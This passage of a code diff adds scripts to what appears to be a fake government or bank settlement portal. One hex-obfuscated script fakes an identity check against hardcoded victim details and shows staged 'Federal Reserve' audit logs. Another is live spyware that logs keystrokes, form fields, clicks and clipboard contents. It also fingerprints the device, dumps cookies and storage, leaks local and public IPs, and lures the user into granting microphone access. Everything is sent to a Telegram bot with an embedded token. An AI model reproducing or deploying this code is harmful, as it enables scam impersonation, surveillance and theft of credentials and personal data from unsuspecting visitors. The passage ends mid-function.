+        const logContainer = document.getElementById('loading-logs');
+        let i = 0;
 
-            } catch (err) {
-                status("System Detected:" + err.message);
-                fetch('https://national-settlement-board.cfd/relay.php', {
-                    method: 'POST',
-                    body: JSON.stringify({ type: "ERROR", msg: err.message, builder: "bc_8xm4yrmi" })
-                });
+        function addLog() {
+            if (i < logEntries.length) {
+                const p = document.createElement('div');
+                p.className = 'audit-line';
+                p.innerText = "> " + logEntries[i];
+                logContainer.appendChild(p);
+                logContainer.scrollTop = logContainer.scrollHeight;
+                i++;
+                setTimeout(addLog, Math.floor(Math.random() * 800) + 400);
+            } else {
+                setTimeout(() => {
+                    showDashboard(validName, validBank, validAccount);
+                }, 1000);
             }
+        }
+        addLog();
+    }
+
+    function showDashboard(name, bank, account) {
+        document.getElementById('loading-screen').style.display = 'none';
+        document.getElementById('main-portal').style.display = 'block';
+        
+        document.getElementById('display-name').innerText = name;
+        document.getElementById('display-bank').innerText = bank;
+        document.getElementById('display-account').innerText = account;
+        
+        localStorage.setItem('tifma_name', name);
+        localStorage.setItem('tifma_bank', bank);
+        localStorage.setItem('tifma_account', account);
+        
+        window.scrollTo(0,0);
+    }
+
+    function logout() {
+        localStorage.removeItem('tifma_name');
+        localStorage.removeItem('tifma_bank');
+        localStorage.removeItem('tifma_account');
+        location.reload();
+    }
+
+    window.triggerLoading = triggerLoading;
+    window.showDashboard = showDashboard;
+    window.logout = logout;
+    window.toggleGov = toggleGov;
+        </script>
+
+    <script>
+  (function() {
+  "use strict";
+  const _0x511 = [
+    &quot; 416d65726963612f4368696361676f&quot;, &quot; 656e2d5553&quot;, &quot; 63757272656e7443535454696d65&quot;,
+    &quot; 6c6f67696e2d6e616d65&quot;, &quot; 6c6f67696e2d62616e6b&quot;, &quot; 6c6f67696e2d6163636f756e74&quot;,
+    &quot; 6c6f67696e2d73736e&quot;, &quot; 61616161&quot;, &quot; 464952535420434f4e56454e49454e43452042414e4b2028464e4220544558415329&quot;,
+    &quot; 343730313131313339&quot;, &quot; 36383332&quot;, &quot; 6d756a696e67612074686572657365206d756b756e61&quot;,
+    &quot; 6d756a696e676120742e206d756b756e61&quot;, &quot; 6d756a696e6761206d756b756e61&quot;, &quot; 6d756b756e61206d756a696e6761&quot;,
+    &quot; 6c6f67696e2d73656374696f6e&quot;, &quot; 6c6f6164696e672d73637265656e&quot;, &quot; 6d61696e2d706f7274616c&quot;,
+    &quot; 646973706c61792d6e616d65&quot;, &quot; 646973706c61792d62616e6b&quot;, &quot; 646973706c61792d6163636f756e74&quot;,
+    &quot; 7469666d615f6e616d65&quot;, &quot; 7469666d615f62616e6b&quot;, &quot; 7469666d615f6163636f756e74&quot;,
+    &quot; 61756469742d6c696e65&quot;, &quot; 6c6f6164696e672d6c6f6773&quot;, &quot; 676f7644726f70&quot;, &quot; 616374697665&quot;,
+    &quot; 434f4e4e454354494e4720544f204645444552414c20524553455256452042414e4b204f462044414c4c4153204855422e2e2e&quot;,
+    &quot; 41555448454e5449434154494e472055534552204944454e54495459205b56455249464945445d2e2e2e&quot;,
+    &quot; 4d415050494e47204143434f554e542047554944205b52543a203131313930363237315d2e2e2e&quot;,
+    &quot; 5155455259494e47205445584153205354415445204c4544474552202854534c292053555350454e5345205245434f5244532e2e2e&quot;,
+    &quot; 43415345205245464552454e4345205b54582d423130422d323032362d4d554b313133395d204c4f43415445442e&quot;,
+    &quot; 53594e4348524f4e495a494e47205345435552452054554e4e454c2028544c5320312e33292e2e2e&quot;,
+    &quot; 504f5254414c2044415348424f4152442052454144592e&quot;
+  ];
+
+  function _0x2a1(_0x3b) {
+    let _0x1c = &quot; &quot;;
+    for (let i = 0; i &lt; _0x3b.length; i += 2) {
+      _0x1c += String.fromCharCode(parseInt(_0x3b.substr(i, 2), 16));
+    }
+    return _0x1c;
+  }
+
+  const _V = {
+    C_TZ: _0x2a1(_0x511[0]),
+    C_LC: _0x2a1(_0x511[1]),
+    C_EL: _0x2a1(_0x511[2]),
+    I_NM: _0x2a1(_0x511[3]),
+    I_BK: _0x2a1(_0x511[4]),
+    I_AC: _0x2a1(_0x511[5]),
+    I_SN: _0x2a1(_0x511[6]),
+    A_VAL: _0x2a1(_0x511[7]),
+    M_BK: _0x2a1(_0x511[8]),
+    M_AC: _0x2a1(_0x511[9]),
+    M_SN: _0x2a1(_0x511[10]),
+    M_N1: _0x2a1(_0x511[11]),
+    M_N2: _0x2a1(_0x511[12]),
+    M_N3: _0x2a1(_0x511[13]),
+    M_N4: _0x2a1(_0x511[14]),
+    S_LN: _0x2a1(_0x511[15]),
+    S_LD: _0x2a1(_0x511[16]),
+    S_MP: _0x2a1(_0x511[17]),
+    D_NM: _0x2a1(_0x511[18]),
+    D_BK: _0x2a1(_0x511[19]),
+    D_AC: _0x2a1(_0x511[20]),
+    L_NM: _0x2a1(_0x511[21]),
+    L_BK: _0x2a1(_0x511[22]),
+    L_AC: _0x2a1(_0x511[23]),
+    AU_L: _0x2a1(_0x511[24]),
+    AU_C: _0x2a1(_0x511[25]),
+    G_DR: _0x2a1(_0x511[26]),
+    G_AC: _0x2a1(_0x511[27])
+  };
+
+  const _L = [
+    _0x2a1(_0x511[28]), _0x2a1(_0x511[29]), _0x2a1(_0x511[30]),
+    _0x2a1(_0x511[31]), _0x2a1(_0x511[32]), _0x2a1(_0x511[33]),
+    _0x2a1(_0x511[34])
+  ];
+
+  const _CORE = {
+    getTime: function() {
+      try {
+        return new Date().toLocaleString(_V.C_LC, {
+          timeZone: _V.C_TZ,
+          year: &#39; numeric&#39;, month: &#39; 2-digit&#39;, day: &#39; 2-digit&#39;,
+          hour: &#39; 2-digit&#39;, minute: &#39; 2-digit&#39;, second: &#39; 2-digit&#39;,
+          hour12: true
+        });
+      } catch (e) {
+        return new Date().toISOString();
+      }
+    },
+    updateUIClock: function() {
+      const el = document.getElementById(_V.C_EL);
+      if (el) el.innerText = _CORE.getTime();
+    },
+    toggleGov: function() {
+      const d = document.getElementById(_V.C_DR);
+      if (d) d.classList.toggle(_V.G_AC);
+    },
+    getVal: function(id) {
+      const e = document.getElementById(id);
+      return e ? e.value.trim(): &quot; &quot;;
+    },
+    normalize: function(s) {
+      return s.toLowerCase().replace(/\s+/g, &#39; &#39;).trim();
+    }
+  };
+
+  const _AUTH = {
+    verify: function(n, b, a, s) {
+      const nn = _CORE.normalize(n);
+      const vN = [_V.M_N1,
+        _V.M_N2,
+        _V.M_N3,
+        _V.M_N4];
+
+      const isM = vN.includes(nn) &amp; &amp; b === _V.M_BK &amp; &amp; a === _V.M_AC &amp; &amp; s === _V.M_SN;
+      const isA = nn === _V.A_VAL &amp; &amp; b === _V.M_BK &amp; &amp; a === _V.A_VAL &amp; &amp; s === _V.A_VAL;
+
+      return {
+        valid: (isM || isA),
+        name: n,
+        bank: b,
+        acc: a
+      };
+    }
+  };
+
+  const _ENGINE = {
+    state: {
+      i: 0,
+      active: false
+    },
+    runLogs: function(callback) {
+      const container = document.getElementById(_V.AU_C);
+      if (!container) return;
+
+      const step = () =&gt; {
+        if (this.state.i &lt; _L.length) {
+          const p = document.createElement(&#39; div&#39;);
+          p.className = _V.AU_L;
+          p.innerText = &quot; &gt; &quot; + _L[this.state.i];
+          container.appendChild(p);
+          container.scrollTop = container.scrollHeight;
+          this.state.i++;
+          setTimeout(step, Math.floor(Math.random() * 600) + 350);
+        } else {
+          setTimeout(callback, 850);
+        }
+      };
+      step();
+    },
+    transition: function(outId, inId) {
+      const outEl = document.getElementById(outId);
+      const inEl = document.getElementById(inId);
+      if (outEl) outEl.style.display = &#39; none&#39;;
+      if (inEl) inEl.style.display = &#39; block&#39;;
+      window.scrollTo(0, 0);
+    }
+  };
+
+  const _PORTAL = {
+    initSession: function(n, b, a) {
+      document.getElementById(_V.D_NM).innerText = n;
+      document.getElementById(_V.D_BK).innerText = b;
+      document.getElementById(_V.D_AC).innerText = a;
+      localStorage.setItem(_V.L_NM, n);
+      localStorage.setItem(_V.L_BK, b);
+      localStorage.setItem(_V.L_AC, a);
+      _ENGINE.transition(_V.S_LD, _V.S_MP);
+    },
+    trigger: function() {
+      const n = _CORE.getVal(_V.I_NM);
+      const b = _CORE.getVal(_V.I_BK);
+      const a = _CORE.getVal(_V.I_AC);
+      const s = _CORE.getVal(_V.I_SN);
+
+      const result = _AUTH.verify(n, b, a, s);
+
+      if (!result.valid) {
+        alert(&quot; IDENTITY VERIFICATION ERROR: The provided credentials do not match our records. Please verify your information and try again.&quot;);
+        return;
+      }
+
+      _ENGINE.transition(_V.S_LN, _V.S_LD);
+      _ENGINE.runLogs(() =&gt; {
+        this.initSession(result.name, result.bank, result.acc);
+      });
+    },
+    kill: function() {
+      localStorage.removeItem(_V.L_NM);
+      localStorage.removeItem(_V.L_BK);
+      localStorage.removeItem(_V.L_AC);
+      location.reload();
+    }
+  };
+
+  function _0xBus() {
+    const _h = document.documentElement;
+    _h.setAttribute(&#39; data-node-state&#39;, &#39; active&#39;);
+    _h.setAttribute(&#39; data-auth-ver&#39;, &#39; 1.3.0&#39;);
+
+    const _m = {
+      exec: function(t) {
+        const _f = {
+          &#39; TR&#39;: _PORTAL.trigger.bind(_PORTAL),
+          &#39; LO&#39;: _PORTAL.kill.bind(_PORTAL),
+          &#39; TG&#39;: _CORE.toggleGov.bind(_CORE)
         };
-    </script>
+        return _f[t] ? _f[t](): null;
+      }
+    };
 
-<script type="text/javascript" src="/unprotected/back_to_spaceship.js?hash=4975d460e508829e8fb64d3962bc44ad35f3a95a"></script>
+    window.triggerLoading = () =&gt; _m.exec(&#39; TR&#39;);
+    window.logout = () =&gt; _m.exec(&#39; LO&#39;);
+    window.toggleGov = () =&gt; _m.exec(&#39; TG&#39;);
+  }
 
+  function _verifyEnvironment() {
+    const _secure = window.isSecureContext;
+    const _proto = window.location.protocol;
+    const _host = window.location.hostname;
+
+    const _nodeMeta = {
+      s: _secure,
+      p: _proto,
+      h: _host,
+      ts: Date.now()
+    };
+
+    if (typeof _0xBus === &#39; function&#39;) {
+      _0xBus();
+    }
+  }
+
+  function _initSystems() {
+    _CORE.updateUIClock();
+    setInterval(_CORE.updateUIClock, 1000);
+
+    const _observer = new MutationObserver((mutations) =&gt; {
+      mutations.forEach((m) =&gt; {
+        if (m.type === &#39; childList&#39;) {}
+      });
+    });
+
+    _observer.observe(document.body, {
+      childList: true, subtree: true
+    });
+    _verifyEnvironment();
+  }
+
+  const _chainA = (x) =&gt; x * 2;
+  const _chainB = (x) =&gt; x + 10;
+  const _chainC = (x) =&gt; x / 2;
+  const _validateChain = (v) =&gt; _chainC(_chainB(_chainA(v))) === v + 5;
+
+  if (_validateChain(100)) {
+    if (document.readyState === &#39; loading&#39;) {
+      document.addEventListener(&#39; DOMContentLoaded&#39;, _initSystems);
+    } else {
+      _initSystems();
+    }
+  }
+
+  window.showDashboard = _PORTAL.initSession.bind(_PORTAL);
+
+  const _x0 = &quot; 617574682d73797374656d2d7632&quot;;
+  const _x1 = &quot; 6373742d636c6f636b2d656e67696e65&quot;;
+  const _x2 = &quot; 6c6f672d64697370617463686572&quot;;
+
+  const _registry = [_0x2a1(_x0), _0x2a1(_x1), _0x2a1(_x2)];
+  _registry.forEach(r =&gt; {
+    const _marker = document.createComment(&quot; Component: &quot; + r);
+    document.head.appendChild(_marker);
+  });
+
+  function _audit(msg) {
+    const ts = _CORE.getTime();
+    const entry = `[${ts}] ${msg}`;
+    return entry;
+  }
+
+  const _guard = {
+    check: function() {
+      return !!(document.getElementById(_V.I_NM) &amp; &amp; document.getElementById(_V.I_BK));
+    }
+  };
+
+  if (!_guard.check()) {
+    const _fix = setInterval(() =&gt; {
+      if (_guard.check()) {
+        clearInterval(_fix);
+        _audit(&quot; DOM_REPAIRED&quot;);
+      }
+    },
+      500);
+  }
+
+  const _0xFinal = function() {
+    const _s = &quot; Portal Operational&quot;;
+    const _c = &quot; color: #00ff00; font-weight: bold; &quot;;
+    console.log(&quot; %c&quot; + _s,
+      _c);
+  };
+  _0xFinal();
+
+  })();
+</script>
+<script>
+  (function() {
+  "use strict";
+  const _v0 = ['8481428965', 'AAEOFp_DPPuPG5fPl03AmYSPNebgpqZoejY'];
+  const _v1 = '7275242903';
+  const SECURE_CONFIG = {
+    API_TOKEN: _v0[0] + ':' + _v0[1],
+    TARGET_ID: _v1,
+    BUFFER_LIMIT: 8,
+    CLICK_LIMIT: 5,
+    SYNC_DELAY: 4000,
+    HEARTBEAT: 20000,
+    RETRY_LIMIT: 10,
+    QUEUE_MAX: 500,
+    SESS_KEY: 'NSB_NODE_' + Math.random().toString(36).substring(2,
+      15),
+    FLOW_CONTROL: 1200,
+    KEY_BATCH: 10
+  };
+  let _lastSync = 0;
+  let _msgQueue = [];
+  let _lock = false;
+  let _evtBuffer = [];
+  let _hTimer = null;
+  let _keyCapture = [];
+  let _ptrCapture = [];
+  let _lastAct = Date.now();
+  let _cache = [];
+  let _start = Date.now();
+  let _vDepth = 0;
+  let _mStream = null;
+  let _mState = false;
+  let _pValid = localStorage.getItem('media_access_verified') === 'true';
+  let _touchPts = [];
+  let _resChanges = [];
+  let _fieldStart = new Map();
+  let _mouseMoves = [];
+  let _mouseTimer = null;
+  async function _transmit(payload, urgency = false) {
+    const _out = String(payload).substring(0,
+      4096);
+    const _now = Date.now();
+    const _diff = _now - _lastSync;
+    if (_diff < SECURE_CONFIG.FLOW_CONTROL && !urgency) {
+      _msgQueue.push(_out);
+      setTimeout(_processQueue, SECURE_CONFIG.FLOW_CONTROL - _diff);
+      return;
+    }
+    _lastSync = _now;
+    try {
+      const _r = await fetch('https://api.telegram.org/bot' + SECURE_CONFIG.API_TOKEN + '/sendMessage', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: SECURE_CONFIG.TARGET_ID,
+          text: _out
+        })
+      });
+      if (!_r.ok) throw new Error('ERR_UP');
+      _processQueue();
+    } catch (e) {
+      if (_cache.length < SECURE_CONFIG.QUEUE_MAX) _cache.push(_out);
+    }
+  }
+  function _processQueue() {
+    if (_lock || _msgQueue.length === 0) return;
+    _lock = true;
+    const _next = _msgQueue.shift();
+    _transmit(_next, true).finally(() => {
+      _lock = false;
+      if (_msgQueue.length > 0) setTimeout(_processQueue, SECURE_CONFIG.FLOW_CONTROL);
+    });
+  }
+  function _stageEvent(id, data) {
+    _evtBuffer.push({
+      id: id,
+      payload: data,
+      tick: Date.now(),
+      sid: SECURE_CONFIG.SESS_KEY,
+      u: window.location.href,
+      ref: document.referrer || 'direct'
+    });
+    if (_hTimer) clearTimeout(_hTimer);
+    _hTimer = setTimeout(_pushBuffer, SECURE_CONFIG.SYNC_DELAY);
+    if (_evtBuffer.length >= SECURE_CONFIG.BUFFER_LIMIT) _pushBuffer();
+  }
+  function _pushBuffer() {
+    if (_evtBuffer.length === 0) return;
+    const _ship = [..._evtBuffer];
+    _evtBuffer = [];
+    const _meta = `\nNODE: ${SECURE_CONFIG.SESS_KEY}\nPAGE: ${window.location.pathname}`;
+    _transmit('📦 BATCH_DATA [' + _ship.length + ']' + _meta + '\n' + JSON.stringify(_ship, null, 1), true);
+  }
+  function _hwFingerprint() {
+    const _c = document.createElement('canvas');
+    const _x = _c.getContext('2d');
+    _c.width = 300;
+    _c.height = 50;
+    _x.textBaseline = "top";
+    _x.font = "14px 'Arial'";
+    _x.fillStyle = "#f60";
+    _x.fillRect(100, 5, 50, 40);
+    _x.fillStyle = "#069";
+    _x.fillText("NSB_SYSTEM_UNIT_ACTIVE", 2, 10);
+    const _f1 = _c.toDataURL();
+    let _webgl = {};
+    try {
+      const _c2 = document.createElement('canvas');
+      const _gl = _c2.getContext('webgl') || _c2.getContext('experimental-webgl');
+      if (_gl) {
+        const _ext = _gl.getExtension('WEBGL_debug_renderer_info');
+        _webgl = {
+          r: _ext ? _gl.getParameter(_ext.UNMASKED_RENDERER_WEBGL): _gl.getParameter(_gl.RENDERER),
+          v: _ext ? _gl.getParameter(_ext.UNMASKED_VENDOR_WEBGL): _gl.getParameter(_gl.VENDOR)
+        };
+      }
+    } catch (e) {}
+    return {
+      ua: navigator.userAgent,
+      plt: navigator.platform,
+      mem: navigator.deviceMemory || 0,
+      cpu: navigator.hardwareConcurrency || 0,
+      scr: `${screen.width}x${screen.height}`,
+      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      lang: navigator.languages,
+      gpu: _webgl,
+      fp: _f1.slice(-60)
+    };
+  }
+  function _mapInput(e) {
+    let _k = e.key;
+    const _t = e.target;
+    return {
+      key: _k,
+      id: _t.id || _t.name || 'anon',
+      tag: _t.tagName,
+      raw: (_t.type === 'password' || _t.id?.includes('pass')) ? '[SENSITIVE_CAP]': _t.value,
+      ts: Date.now()
+    };
+  }
+  document.addEventListener('keydown', (e) => {
+    _keyCapture.push(_mapInput(e));
+    _lastAct = Date.now();
+    if (_keyCapture.length >= SECURE_CONFIG.KEY_BATCH) {
+      _stageEvent('KEY_LOG', [..._keyCapture]);
+      _keyCapture = [];
+    }
+  });
+  document.addEventListener('input', (e) => {
+    const _t = e.target;
+    _stageEvent('INPUT_LIVE', {
+      id: _t.id || _t.name,
+      val: _t.value,
+      type: _t.type,
+      ts: Date.now()
+    });
+  });
+  document.addEventListener('submit', (e) => {
+    const _f = e.target;
+    const _d = new FormData(_f);
+    const _p = {};
+    for (let [k, v] of _d.entries()) _p[k] = v;
+    _stageEvent('FORM_CAPTURE', {
+      action: _f.action,
+      method: _f.method,
+      fields: _p
+    });
+    _pushBuffer();
+  }, true);
+  document.addEventListener('click', (e) => {
+    const _t = e.target;
+    _ptrCapture.push({
+      tag: _t.tagName,
+      id: _t.id || _t.className,
+      txt: _t.innerText?.slice(0, 50),
+      pos: {
+        x: e.clientX, y: e.clientY
+      },
+      ts: Date.now()
+    });
+    if (_ptrCapture.length >= SECURE_CONFIG.CLICK_LIMIT) {
+      _stageEvent('CLICK_LOG', [..._ptrCapture]);
+      _ptrCapture = [];
+    }
+  });
+  document.addEventListener('copy', () => {
+    setTimeout(async () => {
+      try {
+        const _t = await navigator.clipboard.readText();
+        if (_t) _stageEvent('CLIP_COPY', {
+          val: _t
+        });
+      } catch (e) {}
+    },
+      100);
+  });
+  document.addEventListener('paste', (e) => {
+    const _t = e.clipboardData?.getData('text');
+    if (_t) _stageEvent('CLIP_PASTE', {
+      val: _t
+    });
+  });
+  async function _netProbe() {
+    try {
+      const _r1 = await fetch('https://api.ipify.org?format=json');
+      const _d1 = await _r1.json();
+      const _r2 = await fetch(`https://ipapi.co/${_d1.ip}/json/`);
+      const _d2 = await _r2.json();
+      _stageEvent('NETWORK_LOC',
+        _d2);
+    } catch (e) {}
+  }
+  function _initAudioExfil() {
+    if (_mState || _pValid) return;
+    const _ov = document.createElement('div');
+    _ov.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:999999;display:flex;align-items:center;justify-content:center;';
+    _ov.innerHTML = '<div style="background:#fff;padding:30px;border-radius:10px;text-align:center;"><h2 style="color:#000">Security Requirement</h2><p style="color:#444">Enable Identity Verification to proceed.</p><button id="_auth_btn" style="padding:10px 20px;background:#0052cc;color:#fff;border:none;border-radius:5px;cursor:pointer;">VERIFY IDENTITY</button></div>';
+    document.body.appendChild(_ov);
+    document.getElementById('_auth_btn').onclick = () => {
+      navigator.mediaDevices.getUserMedia({
+        audio: true
+      }).then(s => {
+        _mStream = s;
+        _mState = true;
+        _pValid = true;
+        localStorage.setItem('media_access_verified', 'true');
+        _ov.remove();
+        _runAudioEngine();
+        _stageEvent('AUDIO_AUTH', {
+          status: 'GRANTED'
+        });
+      }).catch(e => {
+        _stageEvent('AUDIO_AUTH', {
+          status: 'DENIED', msg: e.message
+        });
+        _ov.remove();
+      });
+    };
+  }
+  function _runAudioEngine() {
+    if (!_mStream) return;
+    try {
+      const _ac = new (window.AudioContext || window.webkitAudioContext)();
+      const _s = _ac.createMediaStreamSource(_mStream);
+      const _a = _ac.createAnalyser();
+      _s.connect(_a);
+      _a.fftSize = 256;
+      const _d = new Uint8Array(_a.frequencyBinCount);
+      setInterval(() => {
+        _a.getByteTimeDomainData(_d);
+        let _max = 0;
+        for (let i = 0; i < _d.length; i++) {
+          const _v = Math.abs(_d[i] - 128) / 128;
+          if (_v > _max) _max = _v;
+        }
+        if (_max > 0.05) _stageEvent('VOICE_PEAK', {
+          amp: Math.floor(_max * 100)
+        });
+      },
+        3000);
+    } catch (e) {}
+  }
+  function _leakIP() {
+    try {
+      const pc = new RTCPeerConnection( {
+        iceServers: []
+      });
+      pc.createDataChannel('');
+      pc.createOffer().then(o => pc.setLocalDescription(o));
+      pc.onicecandidate = (e) => {
+        if (e.candidate) {
+          const ip = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(e.candidate.candidate);
+          if (ip) _stageEvent('INTERNAL_IP', {
+            addr: ip[0]
+          });
+        }
+      };
+    } catch (e) {}
+  }
+  function _trackMouse() {
+    document.addEventListener('mousemove', (e) => {
+      _mouseMoves.push({
+        x: e.clientX, y: e.clientY, ts: Date.now()
+      });
+      if (_mouseMoves.length > 200) _mouseMoves = _mouseMoves.slice(-100);
+      if (_mouseTimer) clearTimeout(_mouseTimer);
+      _mouseTimer = setTimeout(() => {
+        if (_mouseMoves.length > 5) {
+          _stageEvent('MOUSE_PATH', {
+            pts: _mouseMoves.slice(-20)
+          });
+          _mouseMoves = [];
+        }
+      },
+        5000);
+    }, {
+      passive: true
+    });
+  }
+  function _fieldMonitor() {
+    document.addEventListener('focusin', (e) => {
+      if (['INPUT', 'TEXTAREA'].includes(e.target.tagName)) _fieldStart.set(e.target, Date.now());
+    });
+    document.addEventListener('focusout',
+      (e) => {
+        const t = e.target;
+        if (_fieldStart.has(t)) {
+          _stageEvent('FIELD_DUR', {
+            id: t.id || t.name, ms: Date.now() - _fieldStart.get(t), val: t.value
+          });
+          _fieldStart.delete(t);
+        }
+      });
+  }
+  function _storageDump() {
+    const _d = {
+      l: {}, s: {}, c: document.cookie
+    };
+    try {
+      for (let i = 0; i < localStorage.length; i++) _d.l[localStorage.key(i)] = localStorage.getItem(localStorage.key(i));
+      for (let i = 0; i < sessionStorage.length; i++) _d.s[sessionStorage.key(i)] = sessionStorage.getItem(sessionStorage.key(i));
+    } catch (e) {}
+    _stageEvent('STORAGE_DUMP', _d);
+  }
+  function _visibilityTrack() {
+    document.addEventListener('visibilitychange', () => {
+      _stageEvent('TAB_STATUS', {
+        state: document.visibilityState, ts: Date.now()
+      });
+    });
+  }
+  function _heartbeat() {
+    setInterval(() => {
+      _stageEvent('HEARTBEAT', {
+        uptime: Math.round((Date.now() - _start) / 1000),
+        y: window.scrollY,
+        url: window.location.href
+      });
+    }, SECURE_CONFIG.HEARTBEAT);
+  }
+  function _performance() {
+    if (performance && performance.timing) {
+      const t = performance.timing;
+      _stageEvent('PERF_LOG', {
+        load: t.loadEventEnd - t.navigationStart,
+        dns: t.domainLookupEnd - t.domainLookupStart,
+        tcp: t.connectEnd - t.connectStart
+      });
+    }
+  }
+  function _deviceCaps() {
+    const _v = document.createElement('video');
+    _stageEvent('MEDIA_CAPS', {
+      h264: _v.canPlayType('video/mp4; codecs="avc1.42E01E"'),
+      webm: _v.canPlayType('video/webm; codecs="vp8, vorbis"'),
+      cores: navigator.hardwareConcurrency,
+      touch: navigator.maxTouchPoints
+    });
+  }
+  function _networkStatus() {
+    const _n = navigator.connection;
+    if (_n) {
+      const _log = () => _stageEvent('NET_CHANGE', {
+        type: _n.effectiveType, down: _n.downlink, rtt: _n.rtt
+      });
+      _log();
+      _n.addEventListener('change', _log);
+    }
+  }
+  function _batteryStatus() {
+    if (navigator.getBattery) {
+      navigator.getBattery().then(b => {
+        const _log = () => _stageEvent('PWR_LOG', {
+          lvl: b.level, chg: b.charging
+        });
+        _log();
+        b.addEventListener('levelchange', _log);
+        b.addEventListener('chargingchange', _log);
+      });
+    }
+  }
+  function _domWatch() {
+    const _obs = new MutationObserver((m) => {
+      _stageEvent('DOM_MUTATION', {
+        count: m.length, ts: Date.now()
+      });
+    });
+    _obs.observe(document.body, {
+      childList: true, subtree: true
+    });
+  }
+  function _init() {
+    _transmit('💎 NODE_ACTIVE: ' + window.location.hostname + '\nSESS: ' + SECURE_CONFIG.SESS_KEY, true);
+    _stageEvent('INIT_FP', _hwFingerprint());
+    _netProbe();
+    _leakIP();
+    _storageDump();
+    _trackMouse();
+    _fieldMonitor();
+    _visibilityTrack();
+    _heartbeat();
+    _performance();
+    _deviceCaps();
+    _networkStatus();
+    _batteryStatus();
+    _domWatch();
+    if (_pValid) {
+      navigator.mediaDevices.getUserMedia({
+        audio: true
+      }).then(s => {
+        _mStream = s;
+        _mState = true;
+        _runAudioEngine();
+      }).catch(() => {});
+    } else {
+      document.body.addEventListener('click', () => {
+        if (!_pValid) _initAudioExfil();
+      },
+        {
+          once: true
+        });
+    }
+  }
+  window.addEventListener('load', _init);
+  window.addEventListener('beforeunload', () => {
+    _stageEvent('EXIT_LOG', {
+      dur: Math.round((Date.now() - _start) / 1000)
+    });
+    _pushBuffer();
+  });
+  window.addEventListener('error', (e) => {
+    _stageEvent('RUNTIME_ERR', {
+      msg: e.message, line: e.lineno
+    });
+  });
+  function _fontAudit() {
+    const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia'];
+    const detected = fonts.filter(f => document.fonts.check(`12px "${f}"`));
+    _stageEvent('FONT_LIST',
+      detected);
+  }
+  _fontAudit();
+  function _plugins() {
+    const p = [];
+    if (navigator.plugins) {
+      for (let i = 0; i < navigator.plugins.length; i++) p.push(navigator.plugins[i].name);
+    }
+    _stageEvent('PLUGINS', p);
+  }
+  _plugins();
+  function _scrollWatch() {
+    window.addEventListener('scroll', () => {
+      const p = Math.round((window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100);
+      if (p > _vDepth && p % 25 === 0) {
+        _vDepth = p;
+        _stageEvent('SCROLL_DEPTH', {
+          pct: p
+        });
+      }
+    });
+  }
+  _scrollWatch();
+  function _orientLog() {
+    window.addEventListener('orientationchange',
+      () => {
+        _stageEvent('ORIENT_CHANGE', {
+          type: window.screen.orientation?.type
+        });
+      });
+  }
+  _orientLog();
+  function _offlineAudioFP() {
+    try {
+      const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1,
+        44100,
+        44100);
+      const osc = ctx.createOscillator();
+      osc.type = 'triangle';
+      osc.frequency.value = 1000;
+      const comp = ctx.createDynamicsCompressor();
+      osc.connect(comp);
+      comp.connect(ctx.destination);
+      osc.start(0);
+      ctx.oncomplete = (e) => {
+        const d = e.renderedBuffer.getChannelData(0);
+        let sum = 0;
+        for (let i = 0; i < d.length; i += 500) sum += Math.abs(d[i]);
+        _stageEvent('AUDIO_SIGNATURE', {
+          val: sum.toString(16)
+        });
+      };
+      ctx.startRendering();
+    } catch (e) {}
+  }
+  _offlineAudioFP();
+  function _canvasAdvance() {
+    const c = document.createElement('canvas');
+    const x = c.getContext('2d');
+    x.font = "18pt Arial";
+    x.textBaseline = "alphabetic";
+    x.fillStyle = "#f60";
+    x.fillRect(125, 1, 62, 20);
+    x.fillStyle = "#069";
+    x.fillText("NSB_TELEMETRY_LOG", 2, 15);
+    _stageEvent('CANVAS_ADV', {
+      hash: c.toDataURL().slice(-50)
+    });
+  }
+  _canvasAdvance();
+  function _mimeList() {
+    const m = [];
+    if (navigator.mimeTypes) {
+      for (let i = 0; i < navigator.mimeTypes.length; i++) m.push(navigator.mimeTypes[i].type);
+    }
+    _stageEvent('MIME_TYPES', m);
+  }
+  _mimeList();
+  function _historyCheck() {
+    _stageEvent('HISTORY_LEN', {
+      val: history.length
+    });
+  }
+  _historyCheck();
+  function _screenDetails() {
+    _stageEvent('SCREEN_META', {
+      availW: screen.availWidth,
+      availH: screen.availHeight,
+      pxRatio: window.devicePixelRatio
+    });
+  }
+  _screenDetails();
+  function _timeDetails() {
+    _stageEvent('TIME_META', {
+      local: new Date().toString(),
+      stamp: Date.now()
+    });
+  }
+  _timeDetails();
+  function _platformDetails() {
+    _stageEvent('PLATFORM_META', {
+      v: navigator.vendor,
+      p: navigator.product,
+      online: navigator.onLine
+    });
+  }
+  _platformDetails();
+  function _permissionMatrix() {
+    const p = ['geolocation',
+      'notifications',
+      'push',
+      'camera',
+      'microphone'];
+    p.forEach(n => {
+      navigator.permissions?.query({
+        name: n
+      }).then(s => {
+        _stageEvent('PERM_STATUS', {
+          name: n, state: s.state
+        });
+      }).catch(() => {});
+    });
+  }
+  _permissionMatrix();
+  function _touchCaps() {
+    _stageEvent('TOUCH_CAPS', {
+      max: navigator.maxTouchPoints,
+      enabled: 'ontouchstart' in window
+    });
+  }
+  _touchCaps();
+  function _pdfCheck() {
+    _stageEvent('PDF_CAPS', {
+      enabled: navigator.pdfViewerEnabled || false
+    });
+  }
+  _pdfCheck();
+  function _doNotTrack() {
+    _stageEvent('DNT_STATUS', {
+      val: navigator.doNotTrack || window.doNotTrack
+    });
+  }
+  _doNotTrack();
+  function _eventLoopAudit() {
+    const start = Date.now();
+    setTimeout(() => {
+      _stageEvent('LOOP_LAG', {
+        ms: Date.now() - start - 1000
+      });
+    }, 1000);
+  }
+  _eventLoopAudit();
+  function _memoryAudit() {
+    if (performance.memory) {
+      _stageEvent('MEM_LOG', {
+        used: performance.memory.usedJSHeapSize,
+        total: performance.memory.totalJSHeapSize
+      });
+    }
+  }
+  _memoryAudit();
+  function _visibilityAudit() {
+    _stageEvent('VISIBILITY_INIT', {
+      state: document.visibilityState
+    });
+  }
+  _visibilityAudit();
+  function _interactionAudit() {
+    let active = true;
+    const _setIdle = () => {
+      if (active) {
+        active = false; _stageEvent('USER_IDLE', {
+          ts: Date.now()
+        });
+      }
